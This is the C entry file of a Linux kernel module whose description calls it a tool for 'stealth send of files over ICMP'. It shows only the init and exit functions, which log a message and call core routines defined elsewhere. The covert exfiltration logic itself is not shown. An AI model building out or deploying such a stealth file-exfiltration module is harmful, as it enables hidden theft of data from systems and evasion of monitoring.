#include "core.h"

#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("spiderpig");
MODULE_VERSION("1.0.0");
MODULE_DESCRIPTION("an LKM for stealth send of files over ICMP communication");

static int __init mod_init(void)
{
    printk(KERN_DEBUG "kfile-over-icmp: LKM loaded\n");

    core_start();

    return 0; 
}

static void __exit mod_exit(void)
{
    core_stop();

    printk(KERN_DEBUG "kfile-over-icmp: LKM unloaded successfully\n");
}

module_init(mod_init);
module_exit(mod_exit);
